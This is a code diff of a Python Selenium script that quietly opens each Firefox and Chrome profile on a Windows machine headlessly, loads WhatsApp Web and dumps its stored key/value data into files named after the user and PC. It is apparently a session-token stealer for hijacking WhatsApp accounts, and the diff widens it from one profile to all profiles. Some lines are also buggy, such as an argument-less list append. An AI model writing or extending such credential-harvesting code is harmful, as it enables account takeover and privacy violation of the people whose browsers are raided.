@@ -1,6 +1,6 @@
 from selenium import webdriver
 import selenium.common.exceptions as webexcept
-from selenium.webdriver.firefox.options import Options
+from selenium.webdriver.firefox.options import Options as fireOptions
 import os
 import socket
 import getpass
@@ -25,51 +25,57 @@ def get(key=None):
 
 
 if platform.system() == "Windows":
-    noChrome = False
-    noFirefox = False
-    fireoptions = Options()
-    fireoptions.set_preference
-    fireoptions.set_headless(headless=True)
-    chromeoptions = webdriver.ChromeOptions()
-    chromeoptions.set_headless(headless=True)
+    gotChrome = True
+    gotFirefox = True
+    profileList = []
+    appDir = []
+    fireOptions = fireOptions()
+    fireOptions.set_preference
+    fireOptions.set_headless(headless=True)
+    chromeOptions = webdriver.ChromeOptions()
+    chromeOptions.set_headless(headless=True)
     try:
-        driver = webdriver.Firefox(options=fireoptions)
+        driver = webdriver.Firefox(options=fireOptions)
         driver.quit()
     except webexcept.WebDriverException:
-        noFirefox = True
+        gotFirefox = False
     try:
-        driver = webdriver.Chrome(options=chromeoptions)
+        driver = webdriver.Chrome(options=chromeOptions)
         driver.quit()
     except webexcept.WebDriverException:
-        noChrome = True
+        gotChrome = False
 
-if not noFirefox:
-    options = Options()
-    options.set_preference
-    options.set_headless(headless=True)
-    windir = os.listdir(os.environ['APPDATA'] + '\Mozilla\Firefox\Profiles')
-    fireprofile = webdriver.FirefoxProfile(os.environ['APPDATA'] + '\Mozilla\Firefox\Profiles' + '\\' + windir[0])
-    driver = webdriver.Firefox(fireprofile, options=options)
-    driver.get('https://web.whatsapp.com/')
-    for key, value in get().items():
-        with open("saves\\" + ("%s@%s.lwa" % (str(name), str(pc))), "ab") as me:
-            try:
-                me.write(key + ': ' + value + '\n')
-            except UnicodeEncodeError:
-                pass
-    driver.quit()
+    if gotFirefox:
+        windir = os.listdir(os.environ['APPDATA'] + '\Mozilla\Firefox\Profiles')
+        for profile in windir:
+            fireProfile = webdriver.FirefoxProfile(os.environ['APPDATA'] + '\Mozilla\Firefox\Profiles' + '\\' + profile)
+            driver = webdriver.Firefox(fireProfile, options=fireOptions)
+            driver.get('https://web.whatsapp.com/')
+            for key, value in get().items():
+                with open("saves\\" + ("%s@%s-Firefox_%s.lwa" % (str(name), str(pc), str(profile))), "ab") as file:
+                    try:
+                        file.write(key + ': ' + value + '\n')
+                    except UnicodeEncodeError:
+                        pass
+        driver.quit()
 
-if not noChrome:
-    windir = os.environ['USERPROFILE'] + '\Appdata\Local\Google\Chrome\User Data'
-    options = webdriver.ChromeOptions()
-    options.add_argument('user-data-dir=%s' % windir)
-    options.set_headless(headless=True)
-    driver = webdriver.Chrome(chrome_options=options)
-    driver.get('https://web.whatsapp.com/')
-    for key, value in get().items():
-        with open("saves\\" + ("%s@%s.lwa" % (str(name), str(pc))), "ab") as me:
-            try:
-                me.write(key + ': ' + value + '\n')
-            except UnicodeEncodeError:
-                pass
-    driver.quit()
+    if gotChrome:
+        options = webdriver.ChromeOptions()
+        windir = os.environ['USERPROFILE'] + '\Appdata\Local\Google\Chrome\User Data'
+        profileList.append()
+        for profileDir in os.listdir(windir):
+            if "Profile" in profileDir:
+                if profileDir != "System Profile":
+                    profileList.append(profileDir)
+        for profile in profileList:
+            options.add_argument('user-data-dir=%s' % windir + '\\' + profile)
+            options.set_headless(headless=True)
+            driver = webdriver.Chrome(chrome_options=options)
+            driver.get('https://web.whatsapp.com/')
+            for key, value in get().items():
+                with open("saves\\" + ("%s@%s-Chrome_%s.lwa" % (str(name), str(pc), str(profile))), "ab") as file:
+                    try:
+                        file.write(key + ': ' + value + '\n')
+                    except UnicodeEncodeError:
+                        pass
+        driver.quit()
